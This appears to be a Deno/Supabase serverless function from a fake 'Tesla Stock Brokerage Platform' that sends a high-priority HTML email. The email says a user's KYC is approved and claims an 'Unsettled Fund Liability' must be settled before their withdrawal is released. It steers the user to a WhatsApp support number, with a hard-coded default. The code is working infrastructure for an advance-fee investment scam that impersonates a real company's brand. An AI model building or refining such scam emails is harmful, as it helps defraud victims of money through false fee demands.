import { serve } from "https://deno.land/std@0.190.0/http/server.ts";
import { Resend } from "https://esm.sh/resend@2.0.0";
import { FROM_EMAIL, HEADER_GRADIENT, FONT_FAMILY, COLORS } from "../_shared/email-constants.ts";

const resend = new Resend(Deno.env.get("RESEND_API_KEY"));

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

const getCountryName = (code: string): string => {
  const countries: Record<string, string> = {
    RU: 'Russia', US: 'United States', DE: 'Germany', GB: 'United Kingdom',
    FR: 'France', ES: 'Spain', IT: 'Italy', CA: 'Canada', AU: 'Australia',
    NL: 'Netherlands', BE: 'Belgium', AT: 'Austria', CH: 'Switzerland',
    PL: 'Poland', SE: 'Sweden', NO: 'Norway', DK: 'Denmark', FI: 'Finland',
    PT: 'Portugal', GR: 'Greece', IE: 'Ireland', CZ: 'Czech Republic',
    HU: 'Hungary', RO: 'Romania', UA: 'Ukraine', BY: 'Belarus',
    JP: 'Japan', CN: 'China', KR: 'South Korea', IN: 'India',
    BR: 'Brazil', MX: 'Mexico', AR: 'Argentina', ZA: 'South Africa',
    AE: 'United Arab Emirates', SA: 'Saudi Arabia', TR: 'Turkey', IL: 'Israel',
    SG: 'Singapore', HK: 'Hong Kong', TW: 'Taiwan', TH: 'Thailand',
  };
  return countries[code?.toUpperCase()] || code || 'International';
};

interface SettlementPayload {
  userEmail: string;
  userName: string;
  withdrawalId: string;
  netAmount: number;
  currency: string;
  bankCountry: string;
  accountNumber: string;
  paymentMethod: string;
  whatsappPhone?: string;
}

const handler = async (req: Request): Promise<Response> => {
  console.log("send-settlement-required function called");

  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const payload: SettlementPayload = await req.json();
    console.log("Settlement email payload:", {
      userEmail: payload.userEmail,
      userName: payload.userName,
      withdrawalId: payload.withdrawalId,
      netAmount: payload.netAmount,
      currency: payload.currency,
      paymentMethod: payload.paymentMethod,
    });

    if (!payload.userEmail || !payload.userName || !payload.withdrawalId) {
      throw new Error("Missing required fields");
    }

    const sanitize = (str: string) => str?.replace(/[<>]/g, '') || '';
    const userName = sanitize(payload.userName);
    const transactionRef = `TXN-${payload.withdrawalId.slice(0, 8).toUpperCase()}`;
    const countryName = getCountryName(payload.bankCountry);

    const formattedAmount = `$${new Intl.NumberFormat('en-US', {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2,
    }).format(payload.netAmount || 0)}`;

    const whatsappPhone = payload.whatsappPhone || '+12186500840';
    const whatsappLink = `https://wa.me/${whatsappPhone.replace(/[^0-9]/g, '')}`;

    const isCrypto = (payload.paymentMethod || '').toLowerCase().includes('crypto') || (payload.paymentMethod || '').toLowerCase().includes('usdt');

    const accountDisplay = payload.accountNumber
      ? (isCrypto ? `${payload.accountNumber.slice(0, 6)}...${payload.accountNumber.slice(-4)}` : `****${payload.accountNumber.slice(-4)}`)
      : 'On file';

    const destinationDisplay = isCrypto
      ? `USDT Wallet (${accountDisplay})`
      : `${countryName} (${accountDisplay})`;

    const destinationLabel = isCrypto ? 'USDT Wallet' : 'Bank Account';

    const emailHtml = `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>KYC Approved - Settlement Required</title>
</head>
<body style="margin: 0; padding: 0; background-color: #f3f4f6; font-family: ${FONT_FAMILY};">
  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color: #f3f4f6;">
    <tr>
      <td align="center" style="padding: 24px 16px;">
        <table role="presentation" width="650" cellspacing="0" cellpadding="0" style="max-width: 650px; width: 100%; background-color: #ffffff; border-radius: 16px; overflow: hidden; border: 1px solid ${COLORS.cardBorder}; box-shadow: 0 4px 24px rgba(0,0,0,0.08);">

          <!-- Header -->
          <tr>
            <td style="background: ${HEADER_GRADIENT}; padding: 24px 32px; text-align: center;">
              <h1 style="color: #ffffff; font-size: 22px; font-weight: 700; margin: 0; letter-spacing: -0.5px;">
                ✅ Verification Approved
              </h1>
              <p style="color: #ffffff; font-size: 13px; margin: 6px 0 0 0;">
                Final Settlement Required for Fund Disbursement
              </p>
            </td>
          </tr>

          <!-- Main Content -->
          <tr>
            <td style="padding: 28px 32px;">
              <p style="color: ${COLORS.greetingText}; font-size: 15px; line-height: 1.6; margin: 0 0 16px 0;">
                Hello <span style="color: ${COLORS.sectionHeader}; font-weight: 600;">${userName}</span>,
              </p>

              <!-- Success Badge -->
              <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background: linear-gradient(135deg, rgba(34, 197, 94, 0.1) 0%, rgba(22, 163, 74, 0.05) 100%); border: 1px solid rgba(34, 197, 94, 0.2); border-radius: 10px; margin: 0 0 16px 0;">
                <tr>
                  <td style="padding: 14px; text-align: center;">
                    <p style="color: ${COLORS.successText}; font-size: 14px; margin: 0; font-weight: 600;">
                      🎉 Your KYC verification has been successfully approved by our compliance department.
                    </p>
                  </td>
                </tr>
              </table>

              <p style="color: ${COLORS.bodyText}; font-size: 14px; line-height: 1.7; margin: 0 0 16px 0;">
                To finalize the transfer of your withdrawal to your designated <strong style="color: ${COLORS.darkText};">${destinationLabel}</strong>,
                you are required to resolve the <strong style="color: ${COLORS.teslaRed};">Unsettled Fund Liability</strong>.
              </p>

              <p style="color: ${COLORS.secondaryText}; font-size: 13px; line-height: 1.7; margin: 0 0 16px 0;">
                This is a standard protocol to ensure <strong style="color: ${COLORS.darkText};">liquidity clearance</strong> and
                <strong style="color: ${COLORS.darkText};">tax compliance</strong> for cross-border or high-volume brokerage transfers.
              </p>

              <!-- Transaction Summary -->
              <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="background-color: ${COLORS.cardBackground}; border: 1px solid ${COLORS.cardBorder}; border-radius: 10px; margin: 16px 0;">
                <tr>
                  <td style="padding: 18px;">
                    <h3 style="color: ${COLORS.sectionHeader}; font-size: 13px; font-weight: 600; margin: 0 0 14px 0; text-transform: uppercase; letter-spacing: 0.5px;">
                      📊 Transaction Summary
                    </h3>
                    <table role="presentation" width="100%" cellspacing="0" cellpadding="0">
                      <tr>
                        <td style="color: ${COLORS.secondaryText}; font-size: 13px; padding: 8px 0; border-bottom: 1px solid ${COLORS.divider};">Reference</td>
                        <td style="color: ${COLORS.darkText}; font-size: 13px; padding: 8px 0; text-align: right; font-weight: 600; border-bottom: 1px solid ${COLORS.divider};">${transactionRef}</td>
                      </tr>
                      <tr>
                        <td style="color: ${COLORS.secondaryText}; font-size: 13px; padding: 8px 0; border-bottom: 1px solid ${COLORS.divider};">Net Amount</td>
                        <td style="color: ${COLORS.successAmount}; font-size: 17px; padding: 8px 0; text-align: right; font-weight: 700; border-bottom: 1px solid ${COLORS.divider};">${formattedAmount}</td>
                      </tr>
                      <tr>
                        <td style="color: ${COLORS.secondaryText}; font-size: 13px; padding: 8px 0; border-bottom: 1px solid ${COLORS.divider};">Destination</td>
                        <td style="color: ${COLORS.darkText}; font-size: 13px; padding: 8px 0; text-align: right; border-bottom: 1px solid ${COLORS.divider};">${destinationDisplay}</td>
                      </tr>
                      <tr>
                        <td style="color: ${COLORS.secondaryText}; font-size: 13px; padding: 8px 0; border-bottom: 1px solid ${COLORS.divider};">Settlement Status</td>
                        <td style="padding: 8px 0; text-align: right; border-bottom: 1px solid ${COLORS.divider};">
                          <span style="background: rgba(234, 179, 8, 0.15); color: #b45309; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; white-space: nowrap; display: inline-block;">
                            Pending Clearance
                          </span>
                        </td>
                      </tr>
                      <tr>
                        <td style="color: ${COLORS.secondaryText}; font-size: 13px; padding: 8px 0;">Required Action</td>
                        <td style="color: ${COLORS.darkText}; font-size: 13px; padding: 8px 0; text-align: right; font-weight: 600;">Complete Unsettled Fund Liquidation</td>
                      </tr>
                    </table>
                  </td>
                </tr>
              </table>

              <p style="color: ${COLORS.bodyText}; font-size: 13px; line-height: 1.7; margin: 16px 0;">
                Once this administrative settlement is cleared, the <strong style="color: ${COLORS.darkText};">automated disbursement system</strong>
                will credit the funds to your ${destinationLabel.toLowerCase()} <strong style="color: ${COLORS.successAmount};">immediately</strong>.
              </p>

              <!-- WhatsApp CTA -->
              <table role="presentation" width="100%" cellspacing="0" cellpadding="0" style="margin: 12px 0 20px 0;">
                <tr>
                  <td align="center">
                    <a href="${whatsappLink}"
                       style="display: inline-block; background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%); color: #ffffff; text-decoration: none; padding: 14px 40px; border-radius: 8px; font-weight: 600; font-size: 15px; box-shadow: 0 4px 14px rgba(59, 130, 246, 0.4);">
                      💬 Contact Support on WhatsApp
                    </a>
                  </td>
                </tr>
              </table>

              <p style="color: ${COLORS.secondaryText}; font-size: 12px; line-height: 1.6; margin: 0; text-align: center;">
                Our support team is available 24/7 to assist you with the settlement process.
              </p>
            </td>
          </tr>

          <!-- Footer -->
          <tr>
            <td style="padding: 16px 32px; background-color: ${COLORS.footerBackground}; border-top: 1px solid ${COLORS.divider}; text-align: center;">
              <p style="color: ${COLORS.secondaryText}; font-size: 11px; margin: 0;">
                This is an automated message from Tesla Stock Brokerage Platform.<br>
                Please do not reply to this email.
              </p>
              <p style="color: ${COLORS.mutedText}; font-size: 11px; margin: 10px 0 0 0;">
                © 2026 Tesla Stock Platform. All rights reserved.
              </p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>`;

    const emailResponse = await resend.emails.send({
      from: FROM_EMAIL,
      to: [payload.userEmail],
      subject: `Verification Approved: Final Settlement Required for Fund Disbursement [Ref: #${transactionRef}]`,
      html: emailHtml,
      headers: {
        "X-Priority": "1",
        "X-MSMail-Priority": "High",
        "Importance": "high",
      },
    });

    console.log("Settlement email sent successfully:", emailResponse);

    return new Response(JSON.stringify({ success: true, emailResponse }), {
      status: 200,
      headers: { "Content-Type": "application/json", ...corsHeaders },
    });
  } catch (error: unknown) {
    const errorMessage = error instanceof Error ? error.message : "Unknown error";
    console.error("Error in send-settlement-required function:", errorMessage);
    return new Response(
      JSON.stringify({ error: errorMessage }),
      { status: 500, headers: { "Content-Type": "application/json", ...corsHeaders } }
    );
  }
};

serve(handler);
